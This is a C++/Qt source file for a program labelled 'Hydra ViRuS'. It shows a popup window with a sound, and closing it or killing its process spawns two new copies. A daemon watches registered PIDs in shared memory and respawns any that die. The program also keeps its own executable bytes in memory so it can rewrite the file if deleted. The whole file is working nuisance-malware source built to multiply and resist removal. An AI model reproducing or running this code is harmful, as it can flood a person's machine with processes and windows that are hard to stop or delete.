// QT
#include <QtWidgets/QtWidgets>
#include <QtWidgets/QApplication>
#include <QtWidgets/QWidget>
#include <QtWidgets/QPushButton>
#include <QtWidgets/QBoxLayout>
#include <QtGui/QPixmap>
#include <QtGui/QScreen>
#include <QtCore/QProcess>
#include <QtCore/QFile>
#include <QtCore/QFileDevice>
#include <QtCore/QSharedMemory>

// SFML
#include <SFML/Audio/Music.hpp>

// Standard
#include <cstdint>
#include <ctime>
#include <iostream>
#include <iomanip>
#include <cstdlib>
#include <cstring>
#include <thread>

// Graphic and sound
#include "assets.h"
// os_* functions
#include "os.h"

#define WIN_WIDTH 400
#define WIN_HEIGHT 100
#define MAX_NUM_PIDS 30
#define SEGMENT_SZ (MAX_NUM_PIDS*8) // Each pid is int64_t
#define MUSIC_TIME_MS_APPROX 375 

QFile exe_file;
QByteArray exe_data;
int perms;
int64_t daemon_pid;
sf::Music *music;

static void button_response() {
  QApplication::quit();
}

void print_segment_as_hex(QSharedMemory *s) {
  s->lock();
  unsigned char *data = (unsigned char*)s->data();
  int i=0;
  while (i < s->size()) {
    for (int j=0;j<32;j++) {
      std::cout << std::setw(2) << std::hex << (int)data[i] << ' ';
      i++;
    }
    std::cout << std::endl;
  }
  s->unlock();
}

void print_segment_as_long(QSharedMemory *s) {
  s->lock();
  int64_t *data = (int64_t*)s->data(); // 8 bytes
  for (int i=0;i<s->size()/8; i++)
    std::cout << data[i] << std::endl;
  s->unlock();
}

int64_t get_shmem(int at, QSharedMemory *s) {
  s->lock();
  int64_t *shmem = (int64_t*)s->data();
  int64_t thing = shmem[at];
  s->unlock();
  return thing;
}

void set_shmem(int at, int64_t to, QSharedMemory *s) {
  s->lock();
  int64_t *shmem = (int64_t*)s->data();
  shmem[at] = to;
  s->unlock();
}

void append_to_shmem(QSharedMemory *s, QString key) {

  s->lock();
  int64_t *shmem = (int64_t*)s->data();

  for (int i=0;i<MAX_NUM_PIDS;i++) {
    if (shmem[i] == 0) {
      shmem[i] = os_get_pid(); // Register our PID
      s->unlock();
      return;
    }
  }

  s->unlock();
}

void spawn_two_more() {

  QString exe_name = exe_file.fileName();

  if (!exe_file.exists()) {
    QFile out_stream(exe_name);
    out_stream.open(QIODevice::WriteOnly);
    out_stream.write(exe_data);
    out_stream.setPermissions((QFileDevice::Permissions)perms);
    out_stream.close();
  }

  QStringList args;
  // Daemon isn't dead, so start a new hydra with its PID
  //if (os_proc_is_alive(daemon_pid)) {
  QProcess::startDetached(exe_name);
  QProcess::startDetached(exe_name);
  /*}
  else  {
    std::cout << "Daemon was killed?!?" << std::endl;
    qint64 new_daemon_pid;
    QProcess::startDetached(exe_name, args, ".", &new_daemon_pid); // New daemon!
    args << QString::number(new_daemon_pid);
    QProcess::startDetached(exe_name, args);
  }*/
}

void daemon_loop(QSharedMemory *segment) {
  segment->create(SEGMENT_SZ, QSharedMemory::ReadWrite);
  segment->lock();
  memset(segment->data(), 0, SEGMENT_SZ);
  segment->unlock();
  int64_t this_pid = os_get_pid();
  std::cout << "daemon is pid " << this_pid << std::endl;
  set_shmem(0, this_pid, segment);

  QStringList noargs;

  print_segment_as_hex(segment);

  spawn_two_more();

  while (true) {
    os_sleep(1);
    segment->lock();
    int64_t *shmem = (int64_t*)segment->data();
    print_segment_as_hex(segment);
    std::cout << "--- " << std::endl;

    int num_procs_dead = 0;
    
    for (int i=0;i<MAX_NUM_PIDS;i++) {
      if (shmem[i] == 0)
        break;

      // Looks like it was killed!
      if (os_proc_is_alive(shmem[i]) == false)  {
        std::cout << "proc at " << i << " dead?" << std::endl;
        segment->unlock();
        os_sleep(50);
        segment->lock();
        if (os_proc_is_alive(shmem[i]) == false)
          spawn_two_more();
        /*
        qint64 replacement_proc_pid;
        QProcess::startDetached(exe_file.fileName(), noargs, ".", &replacement_proc_pid); 
        shmem[i] = replacement_proc_pid;
        segment->unlock();
        break;*/
        //spawn_two_more();

        /* qint64 new_proc_pid;
        QProcess::startDetached(exe_file.fileName(), noargs, ".", &new_proc_pid); 
        append_to_shmem(segment, QString::number(new_proc_pid));*/
      }
    }
    segment->unlock();
  }
}

void delete_music_after_pause() {
  os_sleep(MUSIC_TIME_MS_APPROX);
  delete music;
}

void register_pid(QSharedMemory *s) {

  os_sleep(25);

  s->lock();
  int64_t *shmem = (int64_t*)s->data();

  for (int i=0;i<MAX_NUM_PIDS;i++) {
    if (os_proc_is_alive(shmem[i]) == false || shmem[i] == 0) {
      shmem[i] = os_get_pid();
      s->unlock();
      return;
    }
  }
  s->unlock();
}



int main(int argc, char* argv[])  {

  exe_file.setFileName(argv[0]);
  QSharedMemory segment("hydra :)ppp");
  bool shmem_attached = segment.attach(QSharedMemory::ReadWrite);

  //std::cout << "alive? " << os_proc_is_alive(get_shmem(0, &segment)) << std::endl;
  std::cout << "attached? " << shmem_attached  << std::endl;

  // Is the master daemon alive?
  if (!shmem_attached)  {
    std::cout << "Are we first shmem instance?!" << std::endl;
    daemon_loop(&segment);
  }

  if (!os_proc_is_alive(get_shmem(0, &segment)))  {
    std::cout << "Daemon looks dead! " << std::endl;
    daemon_loop(&segment);
  }

  os_trap_setup();

  std::cout << "Registering pid!" << std::endl;
  register_pid(&segment);

  daemon_pid = get_shmem(0, &segment);

  // Read in the executable file, in case they try to delete it
  exe_file.open(QIODevice::ReadOnly);
  perms = exe_file.permissions();
  exe_data = exe_file.readAll();

  QApplication::setStyle(QStyleFactory::create("Windows"));
  QApplication app(argc, argv);

  QWidget window(NULL, Qt::Window);
  window.setWindowModality(Qt::ApplicationModal);
  window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);

  // Setup and play Audio
  music = new sf::Music;
  music->openFromMemory(chord_ogg, CHORD_LENGTH);
  //music->setVolume(100);
  music->play();
  //QApplication::beep();

  std::thread t(delete_music_after_pause);

  // Setup layouts
  QBoxLayout layout(QBoxLayout::TopToBottom);
  QBoxLayout row1(QBoxLayout::LeftToRight);
  QBoxLayout row2(QBoxLayout::LeftToRight);
  layout.setSpacing(0);
  row1.setSpacing(0);
  row2.setSpacing(0);

  // Create hydra icon
  QLabel image(&window);
  image.setPixmap(QPixmap(hydra_xpm));
  image.move(10,10);

  // Create message text
  QLabel text("Cut off a head, two more will take its place.\n[ Hydra ViRuS ]");
  text.setAlignment(Qt::AlignHCenter |  Qt::AlignVCenter);

  // Create the button
  QPushButton button;
  button.setFixedSize(96, 26);
  button.setDefault(true);
  button.setText("OK");

  // Put the Window somewhere random on the desktop
  QRect screen = QApplication::desktop()->availableGeometry();
  std::srand(os_get_random());
  int spawn_x = std::rand()%(screen.width() - WIN_WIDTH);
  int spawn_y = std::rand()%(screen.height() - WIN_HEIGHT);
  window.setGeometry(spawn_x, spawn_y, WIN_WIDTH, WIN_HEIGHT);

  // Glue everything together
  row1.addWidget(&text, Qt::AlignLeft);
  row2.addWidget(&button, Qt::AlignHCenter);
  layout.addLayout(&row1);
  layout.addLayout(&row2);
  QObject::connect(&button, &QPushButton::clicked, button_response);

  // Start
  window.setLayout(&layout);
  window.show();
  app.exec();

  // Make sure music is closed
  t.join();

  // Evil
  spawn_two_more();

  return 0;
}
